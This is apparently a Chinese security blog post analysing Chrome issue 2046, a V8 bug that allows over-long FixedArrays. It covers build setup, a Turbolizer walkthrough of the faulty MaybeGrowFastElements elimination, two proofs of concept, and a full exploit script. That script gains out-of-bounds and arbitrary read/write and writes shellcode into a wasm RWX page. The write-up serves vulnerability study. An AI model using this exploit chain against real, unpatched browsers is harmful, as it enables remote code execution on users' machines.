---
layout: post

title: 'Chrome Issue 2046 NewFixedArray 数组长度未验证漏洞分析与利用'

date: '2020-09-07'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'


---

<!-- more -->



## 环境搭建

编译存在漏洞的v8源码：

```
git reset --hard 64cadfcf4a56c0b3b9d3b5cc00905483850d6559
gclient sync
tools/dev/gm.py x64.release
tools/dev/gm.py x64.debug
```

安装Turbolizer可视化工具：

（1）安装npm

```
Ubuntu下默认的apt里面的nodejs不好使，安装最新版的
python-software-properties 有些情况下可能会找不到，然后会提示你安装另一个包，如果是这样的话根据提示安装那个包就好了。

sudo apt-get install curl python-software-properties
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt-get install nodejs
sudo apt-get install npm
```

（2）启动

```
cd v8/v8/tools/turbolizer
npm i
npm run-script build
python -m SimpleHTTPServer 8000
之后通过chrome浏览器访问 127.0.0.1:8000
```

（3）生成Turbolizer文件

```
./d8  --trace-turbo ./poc.js
```



## 基础知识

### JavaScript splice() 方法

定义和用法

splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。

注释：该方法会改变原始数组。

```c
语法：
arrayObject.splice(index,howmany,item1,.....,itemX)

index 	必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。
howmany 	必需。要删除的项目数量。如果设置为 0，则不会删除项目。
item1, ..., itemX 	可选。向数组添加的新项目。
```

### Array.prototype.concat.apply

apply方法会调用一个函数，apply方法的第一个参数会作为被调用函数的this值，apply方法的第二个参数（一个数组，或类数组的对象）会作为被调用对象的arguments值，也就是说该数组的各个元素将会依次成为被调用函数的各个参数；

简单来说，该方法可以将多维数组转化成一维数组。

### Math.max() 

函数返回一组数中的最大值。

### v8 指针压缩

为了节省内存空间，v8将64位的指针压缩成了32位，具体做法是将高32位存放在r13寄存器，用4个字节存储低32位，在访问某个指针时，就将低32位指针加上r13保存的高32位。

同时，为了进一步节省内存空间，之前SMI 存储为value « 32，低32位都为0，现在用SMI的值用4个字节存储，并且为了不和指针混淆，最后一位不用（指针最后一位为1），所以将value « 1，相当于将原来的值乘以了2。

demo 代码如下：

```javascript
var a = [0, 1, 2, 3, 4];
%DebugPrint(a);
%SystemBreak();
```

![image-20200820162325505](..\image\2020-09-07-chrome-Torque漏洞分析\7.png)

### v8各个类型的转化

PACKED_SMI_ELEMENTS：小整数，又称 Smi。

PACKED_DOUBLE_ELEMENTS： 双精度浮点数，浮点数和不能表示为 Smi 的整数。

PACKED_ELEMENTS：常规元素，不能表示为 Smi 或双精度的值。

转化关系如下：

![image-20200909153546662](..\image\2020-09-07-chrome-Torque漏洞分析\1.png)

元素种类转换只能从一个方向进行：从特定的（例如 PACKED_SMI_ELEMENTS）到更一般的（例如 PACKED_ELEMENTS）。例如，一旦数组被标记为 PACKED_ELEMENTS，它就不能回到 PACKED_DOUBLE_ELEMENTS。

demo 代码：

```javascript
const array = [1, 2, 3];
// elements kind: PACKED_SMI_ELEMENTS
array.push(4.56);
// elements kind: PACKED_DOUBLE_ELEMENTS
array.push('x');
// elements kind: PACKED_ELEMENTS
```

PACKED  转化到 HOLEY类型：

demo代码：

```javascript
const array = [1, 2, 3, 4.56, 'x'];
// elements kind: PACKED_ELEMENTS
array.length; // 5
array[9] = 1; // array[5] until array[8] are now holes
// elements kind: HOLEY_ELEMENTS
```

即将密集数组转化到稀疏数组。

### 处理优化的各个阶段

![image-20200807180247564](..\image\2020-09-07-chrome-Torque漏洞分析\8.png)



## 漏洞分析

漏洞在于CodeStubAssembler::AllocateFixedArray 的两个宏实现：

```c
macro NewFixedArray<Iterator: type>(length: intptr, it: Iterator): FixedArray {
  if (length == 0) return kEmptyFixedArray;
  return new
  FixedArray{map: kFixedArrayMap, length: Convert<Smi>(length), objects: ...it};
}

macro NewFixedDoubleArray<Iterator: type>(
    length: intptr, it: Iterator): FixedDoubleArray|EmptyFixedArray {
  if (length == 0) return kEmptyFixedArray;
  return new FixedDoubleArray{
    map: kFixedDoubleArrayMap,
    length: Convert<Smi>(length)
    floats: ...it
  };
}
```

在两个宏实现中都没有对length的边界大小进行判断就直接新建相应对象，其中FixedArray对象最大长度FixedArray::kMaxLength为0x7fffffd，FixedDoubleArray对象最大长度为FixedDoubleArray::kMaxLength为0x3fffffe。

所以漏洞在于能够创建大于kMaxLength的FixedArray或FixedDoubleArray对象。

漏洞调用链：

```c
// builtins/array-splice.tq
ArrayPrototypeSplice -> FastArraySplice -> FastSplice -> Extract -> ExtractFixedArray -> NewFixedArray
```



Poc1：

```javascript
array = Array(0x80000).fill(1); // [1]
array.prop = 1; // [2]
args = Array(0x100 - 1).fill(array); // [3]
args.push(Array(0x80000 - 4).fill(2)); // [4]
giant_array = Array.prototype.concat.apply([], args); // [5]
giant_array.splice(giant_array.length, 0, 3, 3, 3, 3); // [6]
%DebugPrint(giant_array.length); // 输出DebugPrint: Smi: 0x8000000 (134217728)
```

[1] 处申请了一个0x80000大小的数组，[3]处又创建了一个0xff大小，每个元素为array的对象，此时0xff * 0x80000 = 0x7f80000 个元素。[4] 处再push进一个0x7fffc个元素的数组，此时共有0x7f80000 + 0x7fffc = 0x7fffffc个元素，而FixedDoubleArray::kMaxLength = 0x7fffffd。[5]处利用Array.prototype.concat.apply 将上述混合的对象转化成一维数组。最后，[6]处再次利用splice方法添加4个元素，现在一共有0x7fffffc + 4 = 0x8000000个元素，导致giant_array的长度为FixedArray::kMaxLength + 3。

[2] 处设置属性是为了调用Array.prototype.concat时进入慢路径，因为快路径上有长度检查：

```javascript
// builtins/builtins-array.cc:1414
MaybeHandle<JSArray> Fast_ArrayConcat(Isolate* isolate,
                                      BuiltinArguments* args) {
  // ...
  
  // Throw an Error if we overflow the FixedArray limits
  if (FixedDoubleArray::kMaxLength < result_len ||
      FixedArray::kMaxLength < result_len) {
    AllowHeapAllocation gc;
    THROW_NEW_ERROR(isolate,
                    NewRangeError(MessageTemplate::kInvalidArrayLength),
                    JSArray);
  }
```

Poc2 和Poc1 类似，只是将数组类型改成了HOLEY_DOUBLE_ELEMENTS，因为HOLEY_DOUBLE_ELEMENTS类型大小最大为0x3fffffe，能更快地触发漏洞。

Poc2：

```javascript
// HOLEY_DOUBLE_ELEMENTS kind, size=0x40000, filled with 1.1's
array = Array(0x40000).fill(1.1);

// Total number of elements in `args`: 0x40000 * 0xff = 0x3fc0000
args = Array(0x100 - 1).fill(array);

// We want a size that's just less than FixedDoubleArray::kMaxLength = 0x3ffffe
// This new array that is pushed onto `args` can actually have a maximum size 
// of (0x40000 - 2), but Sergey chooses to use (0x40000 - 4)
// Total number of elements in `args`: 0x3fc0000 + 0x3fffc = 0x3fffffc
args.push(Array(0x40000 - 4).fill(2.2));

// `Array.prototype.concat` fast path, the length check passes as the final
// length of `giant_array` becomes 0x3fffffc, which is equal to
// `FixedDoubleArray::kMaxLength - 2`
giant_array = Array.prototype.concat.apply([], args);

// No length check on `Array.prototype.splice`, `giant_array.length` is now
// 0x3ffffff, which is `FixedDoubleArray::kMaxLength + 1`
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double =
    new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0); // [1]

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];

  corrupting_array[x] = length_as_double;
  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}
```



在Turbolizer  V8.TFTyper 137 中可以看到Poc2的执行过程：

![image-20200907183228650](..\image\2020-09-07-chrome-Torque漏洞分析\2.png)

Turbolizer 认为array.length的长度应该处于Double Array的size范围内，为(0, 67108862)，而实际array.length 为67108863，导致后续的计算和实际结果并不相同。具体计算过程如下：

```javascript
function trigger(array) {
  var x = array.length; // Range(0, 67108862), actual: Range(0, 67108863), x = 67108863
  x -= 67108861; // Range(-67108861, 1), actual: Range(-67108861, 2), x = 2
  x = Math.max(x, 0); // Range(0, 1), actual: Range(0, 2), x = 2
  x *= 6; // Range(0, 6), actual: Range(0, 12), x = 12
  x -= 5; // Range(-5, 1), actual: Range(-5, 7), x = 7
  x = Math.max(x, 0); // Range(0, 1), actual: Range(0, 7), x = 7

  // [...]
}
```

最后得到x的值为7，而Turbolizer认为x的范围为（0，1），后续可以造成越界访问。

关键是后续越界写时，会有MaybeGrowFastElements检查是否将数组类型转成稀疏数组，如下图，图中的CheckBounds是用于检查数组索引是否大于'length+1024'，如果大于'length+1024'，就会将backing store转成字典，无法进行优化，所以越界读写也有范围限制，要突破该限制，可以在后面布置一个浮点型数组，修改其length，构造另一个可越界读写的数组，且没有限制。

图中左边红框NumberSilenceNaN 表示length_as_double，而索引x的判断经由右边的CheckBounds检查和MaybeGrowFastElements检查，最后在StoreElement 进行"corrupting_array[x] = length_as_double;" 存储。

![image-20200908141735407](..\image\2020-09-07-chrome-Torque漏洞分析\4.png)



CheckBounds检查经过之前的处理，x的范围已经被认为是为（0，1），接下来我们看在**LoadElimination** 阶段如何优化消除了MaybeGrowFastElements ：

![image-20200908142925285](..\image\2020-09-07-chrome-Torque漏洞分析\5.png)



**LoadElimination** 阶段遇到MaybeGrowFastElements 节点会调用ReduceMaybeGrowFastElements 尝试进行优化消除：

```c
// compiler/typed-optimization.cc:166
Reduction TypedOptimization::ReduceMaybeGrowFastElements(Node* node) {
  Node* const elements = NodeProperties::GetValueInput(node, 1);
  Node* const index = NodeProperties::GetValueInput(node, 2); // [1]
  Node* const length = NodeProperties::GetValueInput(node, 3); // [2]
  Node* const effect = NodeProperties::GetEffectInput(node);
  Node* const control = NodeProperties::GetControlInput(node);

  Type const index_type = NodeProperties::GetType(index);
  Type const length_type = NodeProperties::GetType(length);

  // Both `index` and `length` need to be unsigned Smis
  CHECK(index_type.Is(Type::Unsigned31()));
  CHECK(length_type.Is(Type::Unsigned31()));

  if (!index_type.IsNone() && !length_type.IsNone() && // [3]
      index_type.Max() < length_type.Min()) {
    Node* check_bounds = graph()->NewNode( // [4]
        simplified()->CheckBounds(FeedbackSource{},
                                  CheckBoundsFlag::kAbortOnOutOfBounds),
        index, length, effect, control);
    ReplaceWithValue(node, elements); // [5]
    return Replace(check_bounds);
  }

  return NoChange();
}
```

由上述可知：[1] 处为索引的值，范围为（0，1），[2]处为corrupting_array的length，范围为(0, 134217725)，经过优化后变为(2, 2)，因为循环中corrupting_array赋值只有两个元素，并且没有被修改。所以[3] 处的index_type.Max()为1， length_type.Min()为2，说明索引比数组长度小，并不需要对数组进行扩展。

 进入if判断后，[4] 处创建一个新的CheckBounds节点（假设为node_x），会检查实际index是否小于数组大小，如果创建成功，实际index此时为7，不会小于数组大小，无法通过检查。但[5] 处的 ReplaceWithValue(node, elements);操作会导致CheckBounds节点无法创建成功。

ReplaceWithValue 函数如下：

```c
void GraphReducer::ReplaceWithValue(Node* node, Node* value, Node* effect,
                                    Node* control) {
  if (effect == nullptr && node->op()->EffectInputCount() > 0) {
    effect = NodeProperties::GetEffectInput(node); // [1]
  }
  if (control == nullptr && node->op()->ControlInputCount() > 0) {
    control = NodeProperties::GetControlInput(node);
  }

  // Requires distinguishing between value, effect and control edges.
  for (Edge edge : node->use_edges()) { // [2]
    Node* const user = edge.from();
    DCHECK(!user->IsDead());
    if (NodeProperties::IsControlEdge(edge)) {
      if (user->opcode() == IrOpcode::kIfSuccess) {
        Replace(user, control);
      } else if (user->opcode() == IrOpcode::kIfException) {
        DCHECK_NOT_NULL(dead_);
        edge.UpdateTo(dead_);
        Revisit(user);
      } else {
        DCHECK_NOT_NULL(control);
        edge.UpdateTo(control);
        Revisit(user);
      }
    } else if (NodeProperties::IsEffectEdge(edge)) {
      DCHECK_NOT_NULL(effect);
      edge.UpdateTo(effect); // [3]
      Revisit(user);
    } else {
      DCHECK_NOT_NULL(value);
      edge.UpdateTo(value);  // [4]
      Revisit(user);
    }
  }
}

void UpdateTo(Node* new_to) {
    Node* old_to = *input_ptr_;
    if (old_to != new_to) {
      if (old_to) old_to->RemoveUse(use_);
      *input_ptr_ = new_to;
      if (new_to) new_to->AppendUse(use_);
    }
  }
  ...
  void Node::RemoveUse(Use* use) {
  DCHECK(first_use_ == nullptr || first_use_->prev == nullptr);
  if (use->prev) {
    DCHECK_NE(first_use_, use);
    use->prev->next = use->next; // 将use移走
  } else {
    DCHECK_EQ(first_use_, use);
    first_use_ = use->next;
  }
  if (use->next) {
    use->next->prev = use->prev;
  }
}
```

[2] 处是遍历节点的use边，此时节点为MaybeGrowFastElements，use边为"MaybeGrowFastElements <--- StoreElement "，该循环的作用是将use边的"input node"（此处为MaybeGrowFastElements节点）通过[4] 处的edge.UpdateTo(value) -> Node::RemoveUse 的链表操作将节点移走，替换成传进的参数value（即LoadField[+8] 节点）。

效果如下：

```
             value                      value
LoadField[+8] <--- MaybeGrowFastElements <--- StoreElement 
              edge                       edge
              
将MaybeGrowFastElements节点移走：

LoadField[+8] <--- StoreElement
```

MaybeGrowFastElements节点的input 边和 use边 关系如下图所示：

![image-20200909202020063](..\image\2020-09-07-chrome-Torque漏洞分析\10.png)

调用 ReplaceWithValue(node, elements); 本来是想将新生成的CheckBounds节点（node_x）替换 MaybeGrowFastElements，这样use边就变为CheckBounds（node_x）<--- StoreField[+12] 和 CheckBounds（node_x）<---  EffectPhi。

但调用 ReplaceWithValue(node, elements); 时effect参数为空，所以进入[1]处，取原来节点的输入边作为effect，即"CheckBounds <--- MaybeGrowFastElements" （此处CheckBounds为之前检查索引是否小于length + 1024，设为node_y）。在[3] 处用effect进行替换，导致use边就变为CheckBounds（node_y）<--- StoreField[+12] 和 CheckBounds（node_y）<---  EffectPhi。

这样导致node_x失去use边，变成无效节点。

![image-20200909211837290](..\image\2020-09-07-chrome-Torque漏洞分析\11.png)



## 漏洞利用

（1）利用漏洞可以越界读写，在后面布置一个浮点型数组oob_array，越界修改它的长度，就可以通过这个浮点型数组进行越界读写，更加方便。

（2）利用越界数组搜索ArrayBuffer数组，找到backing_store所在位置，可以通过backing_store构造任意读写的原语

搜索需要注意的是由于第（1）步覆盖length时，将elements字段也覆盖了（新版v8引进的指针压缩，导致字段都占四个字节，而浮点型数组赋值是8个字节为单位）。所以将elements覆盖成1（表示指针），即从0起始地址开始搜索。然后根据调试确定ArrayBuffer 以及后面的wasm Instance大概处于什么内存区间，进行遍历搜索。在笔者的环境中，搜索以下几个区域：

```javascript
var search_space = [[0x8902000/8, (0x8940000/8)-1], [0x8213000/8, (0x8280000/8)-1], [(0x8040000-8)/8, 0x805b000/8], [0x8100000/8, (0x818d000/8)-1], [0x8740000/8, (0x8900000/8)-1], [0x8901000/8, (0x8940000/8)-1]];
```

该方法由于某个区域可能不可访问，导致崩溃，所以exp执行成功有一定概率。

（3）利用越界数组搜索wasm function的位置，这里在mask后面布置的兑现是wasm Instance，因为rwx区域位于wasm Instance +0x68处，可以直接读取。而不用根据wasm function->wasm_shared_info->wasm_data->wasm_rwx 构造任意读原语一步步读取。

（4）利用任意写原语将shellcode 写入 rwx区域，即可完成利用。

编写该利用存在的坑：由于越界数组为浮点型，每次读写都是8个字节，而由于v8指针压缩的缘故，字段都被保存为4个字节，所以读写的字段可能位于高4个字节或低4个字节，就需要根据读出的内容进行分情况判断。

exp 代码：

```javascript
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

var arraybuf = new ArrayBuffer(0x12333);

function f2i(f)
{
	float64[0] = f;
	return BigInt(Uint32[0]) + (BigInt(Uint32[1]) << 32n);
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}


function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double = new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];

var obj;
var corrupting_array;
var corrupted_array;

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0); // [1]

  corrupting_array = [0.1, 0.1];
  corrupted_array = [0.1];
  obj = {mark: 0xdead, obj: wasmInstance};
  
  corrupting_array[x] = length_as_double;

  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

var oob_array = trigger(giant_array)[1];

console.log("[+] conrrupted array length : 0x" + hex(oob_array.length));


gc();

var backing_store_idx = 0;
var search_space = [[0x8902000/8, (0x8940000/8)-1], [0x8213000/8, (0x8280000/8)-1], [(0x8040000-8)/8, 0x805b000/8], [0x8100000/8, (0x818d000/8)-1], [0x8740000/8, (0x8900000/8)-1], [0x8901000/8, (0x8940000/8)-1]];

for(let i = 0; i < search_space.length; i++)
{
	var find = 0;
	for(let j = search_space[i][0]; j < search_space[i][1]; j++)
	{
		if((f2i(oob_array[j]) & 0xffffffffn) == 0x12333n /*|| ((f2i(oob_array[j])) >> 32n) == 0x12333n*/){
			backing_store_idx = j + 1;
			console.log("[+] find backing_store : 0x" + hex(f2i(oob_array[backing_store_idx])));
			if(((f2i(oob_array[j+1])) & 0xfffn) == 0x0n){
				find = 1;
				break;
			}
		}
		else if(((f2i(oob_array[j])) >> 32n) == 0x12333n){
			backing_store_idx = j;
		}
	}
	if(find == 1) break;
}

var data_view = new DataView(arraybuf);

function dataview_read64(addr)
{
	oob_array[backing_store_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	oob_array[backing_store_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

for(let i = 0; i < search_space.length; i++)
{
	var find = 0;
	for(let j = search_space[i][0]; j < search_space[i][1]; j++)
	{
		if((f2i(oob_array[j]) & 0xffffffffn) == 0x0001bd5an ){ // 0x1bd5a = 0xdead *2
			var wasmfunc_addr_idx = j;
			var wasmfunc_addr = (f2i(oob_array[wasmfunc_addr_idx])) >> 32n;
			console.log("[+] leak wasm_func_addr : 0x" + hex(f2i(oob_array[j])));
			console.log("[+] find wasm_func_addr : 0x" + hex(wasmfunc_addr));
			find = 1;
			break;
		}
	}
	if(find == 1) break;
}

var wasm_rwx_idx = Number((wasmfunc_addr -1n +0x68n)/8n);
console.log("[+] find wasm_rwx_idx: 0x" + hex(wasm_rwx_idx*8));
var wasm_rwx_addr_low = (f2i(oob_array[wasm_rwx_idx-1])) >> 32n;
console.log("[+] find wasm_rwx_addr_low : 0x" + hex(wasm_rwx_addr_low));

if((wasm_rwx_addr_low & 0xfffn) != 0x000n){
	var wasm_rwx_addr = (f2i(oob_array[wasm_rwx_idx-1]));
	console.log("[+] find wasm_rwx_addr: 0x" + hex(wasm_rwx_addr));
}else{
	var wasm_rwx_addr_high = ((f2i(oob_array[wasm_rwx_idx])) & 0xffffffffn) << 32n;
	console.log("[+] find wasm_rwx_addr_high : 0x" + hex(wasm_rwx_addr_high));
	wasm_rwx_addr = wasm_rwx_addr_high + wasm_rwx_addr_low;
	console.log("[+] find wasm_rwx_addr : 0x" + hex(wasm_rwx_addr));
}

dataview_write(wasm_rwx_addr, shellcode);
//%DebugPrint(arraybuf);
wasm_function();
```



运行效果图：

![image-20200909165056913](..\image\2020-09-07-chrome-Torque漏洞分析\6.png)

## 参考链接

https://www.elttam.com/blog/simple-bugs-with-complex-exploits/#the-codestubassembler

https://v8.dev/blog/elements-kinds

https://www.youtube.com/watch?v=KiWEWLwQ3oI

https://bugs.chromium.org/p/project-zero/issues/detail?id=2046

https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/

https://eternalsakura13.com/2018/08/21/v8_graph/